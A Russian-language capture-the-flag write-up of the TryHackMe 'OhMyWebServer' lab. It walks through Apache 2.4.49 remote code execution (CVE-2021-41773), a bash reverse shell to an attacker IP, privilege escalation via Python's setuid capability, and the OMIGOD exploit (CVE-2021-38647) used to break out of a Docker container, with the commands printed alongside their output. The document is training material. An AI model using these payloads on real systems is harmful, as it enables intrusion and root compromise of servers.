## OhMyWebServer
- https://tryhackme.com/room/ohmyweb
- RCE, Docker

## Разведка
Сканируем сеть
nmap -sC -sV
- Стандартные скрипты
- сканирование версий

```
─$ nmap -sC -sV 10.66.139.217
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-06 15:44 +0300
Nmap scan report for 10.66.139.217
Host is up (0.16s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Consult - Business Consultancy Agency Template | Home
|_http-server-header: Apache/2.4.49 (Unix)
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.85 seconds
 
```

## Эксплуатация
На 80 порту открыт Apache httpd 2.4.49. Найдем на эту версию CVE

- https://github.com/mr-exo/CVE-2021-41773 - подробнее про CVE.
```
curl 'http://10.66.139.217/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; id'
uid=1(daemon) gid=1(daemon) groups=1(daemon)

```
Данная CVE позволяет удаленно выполнять команды (**RCE**). Это замечательно! пробуем прокинуть reverse shell через revshells.com

Открываем порт:
```
nc -lvnp 9001
listening on [any] 9001 ...
```

Прокидываем классическую команду:

```
bash -i >& /dev/tcp/192.168.180.184/9001 0>&1
```

В нашу RCE:
```
сurl 'http://10.67.152.41/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' --data 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/192.168.180.184/9001 0>&1'

```

И получаем шелл!
```
nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.180.184] from (UNKNOWN) [10.66.139.217] 52462
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
daemon@4a70924bafa0:/bin$ id
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)

```

4a70924bafa0 — это формат Docker container ID. => Приложение скорее всего запущенно в докере и мы сейчас внутри контейнера.

После просмотра корневой папки становится очевидно что мы внутри контейнера, тк / - пустой

Какие вообще есть варианты дальнейших действий?

- искать SUID-файлы
- искать capabilites
- искать баги в процессах контейнера

Давайте проверим есть ли в контейнере бинариники с повышенными правами:
```
daemon@4a70924bafa0:/home$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep
```

Отлично! есть Python, поэтому смело повышаем права до root в контейнере:
- https://gtfobins.github.io/gtfobins/ тут есть про повышение привелегий через python

```
daemon@4a70924bafa0:/bin$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")' 
root@4a70924bafa0:/bin# cd /root/
cd /root/
root@4a70924bafa0:/root# ls
ls
user.txt
root@4a70924bafa0:/root# cat user.txt
cat user.txt
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
```
Получаем наш юзер флаг
## Root

Теперь надо из контейнера попасть на хост. Смотрим сеть:
```
root@4a70924bafa0:/tmp# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 4052  bytes 6251230 (5.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2880  bytes 1591499 (1.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

127.0.0.1 - хост, а 172.17.0.2 - докер контейнер.

Давайте подумаем. Хост должен быть уязвим. Контейнер часто может связываться с хостом. Надо понять как мы можем подключится, может на хосте есть ssh, http и тп. Можно попробовать просканировать порты, но в контейнере нет nmap, поэтому прокидываем его со своей машины: 

Бинарник nmap можно взять здесь - https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap

У себя:
```
└─$ python -m http.server 9002
Serving HTTP on 0.0.0.0 port 9002 (http://0.0.0.0:9002/) ...
10.67.152.41 - - [06/Jan/2026 17:26:47] "GET /nmap HTTP/1.1" 200 -
```

На машине:
```
curl http://192.168.180.184/nmap -o /tmp/nmap
```

Выдаем файлу права
```
root@4a70924bafa0:/tmp# chmod +x nmap
```

Сканируем все порты
```
root@4a70924bafa0:/tmp# ./nmap 172.17.0.1 -p- --min-rate 5000
./nmap 172.17.0.1 -p- --min-rate 5000

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2026-01-06 14:36 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.ec2.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000040s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:ED:BD:AD:0D (Unknown)
```
Флаг **--min-rate 5000** для скорости перебора, -p- - для перебора всех портов, вдруг там что-то нестандартное.

Интересные порты 5985 и 5986. Google по запросу “port 5986 exploit” → приводит к **CVE-2021-38647 (OMIGOD)**

- https://github.com/AlteredSecurity/CVE-2021-38647 - можно подробнее почитать

Так же прокидываем скрипт на машину:
```
curl http://192.168.180.184:9002/CVE-2021-38647.py
```

И читаем root флаг
```
root@4a70924bafa0:/tmp# python3 CVE-2021-38647.py -t 172.17.0.1 -c 'whoami;pwd;id;hostname;uname -a;cat /root/root.txt;'
<hoami;pwd;id;hostname;uname -a;cat /root/root.txt;'
root
/var/opt/microsoft/scx/tmp
uid=0(root) gid=0(root) groups=0(root)
ubuntu
Linux ubuntu 5.4.0-88-generic #99-Ubuntu SMP Thu Sep 23 17:29:00 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
THM{7f147ef1f36da9ae29529890a1b6011f}
```

## Итог: почему удалось взломать?

- Устаревшая версия Apache
- Небезопасные Linux Capabilities
